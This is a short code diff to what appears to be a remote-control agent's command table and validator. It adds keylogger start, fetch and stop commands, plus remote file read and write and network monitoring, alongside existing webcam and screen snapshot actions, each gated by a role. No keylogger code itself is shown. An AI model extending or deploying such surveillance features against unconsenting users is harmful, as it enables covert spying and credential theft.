@@ -12,6 +12,12 @@ COMMANDS = {
     "POWER_ACTION":              "admin",
     "SCREEN_SNAPSHOT":           "admin",
     "WEBCAM_SNAPSHOT":           "admin",
+    "START_KEYLOGGER":           "admin",
+    "GET_KEYLOGGER":             "admin",
+    "STOP_KEYLOGGER":            "admin",
+    "READ_FILE":                 "operator",
+    "WRITE_FILE":                "admin",
+    "NETWORK_MONITOR":           "operator",
 }
 RANK = {"viewer": 0, "operator": 1, "admin": 2}
 
@@ -37,4 +43,9 @@ def validate_command(action: object, payload: object, role: str) -> str | None:
         return "invalid power operation"
     if action == "LIST_FILES" and not isinstance(payload.get("path", ""), str):
         return "path must be a string"
+    
+    if action in {"READ_FILE", "WRITE_FILE"} and not isinstance(payload.get("path", ""), str):
+        return "path must be a string"
+    if action == "WRITE_FILE" and not isinstance(payload.get("data", ""), str):
+        return "data must be a base64 string"
     return None
